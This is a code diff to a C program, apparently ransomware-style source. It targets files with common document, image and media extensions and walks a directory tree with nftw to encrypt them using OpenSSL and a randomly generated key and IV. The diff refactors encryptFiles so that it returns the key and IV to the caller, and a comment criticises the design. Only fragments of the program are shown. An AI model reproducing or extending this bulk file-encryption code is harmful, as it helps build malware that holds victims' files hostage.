@@ -6,12 +6,12 @@
 #include <openssl/err.h>
 #include <openssl/rand.h>
 
+#include "encrypt.h"
+
 char *const extensions[] = {".jpg", ".gif", ".jpeg", ".png", ".doc", ".docx", ".xls",
       ".xlsx", ".ppt", ".pptx", ".mp3", ".mp4", ".pdf"};
 const int extensionsSize = 13;
 const int descriptors = 10;
-#define BLOCK_SIZE 16
-#define KEY_SIZE 32
 
 struct enc_status {
 	unsigned char plaintext[BLOCK_SIZE];
@@ -76,9 +76,13 @@ int shouldEncrypt(const char *name, const struct stat *stats, int flag, struct F
 	return 0;
 }
 
-int encryptFiles(const char *dir) {
+// This is horrible design; breaks if encryptFiles is called again
+// Maybe change to class?
+int encryptFiles(const char *dir, unsigned char **key, unsigned char **iv) {
 	handleErrors(RAND_bytes(status.key, KEY_SIZE));
 	handleErrors(RAND_bytes(status.iv, BLOCK_SIZE));
 
+	*key = status.key;
+	*iv = status.iv;
 	return nftw(dir, shouldEncrypt, descriptors, 0);
 }
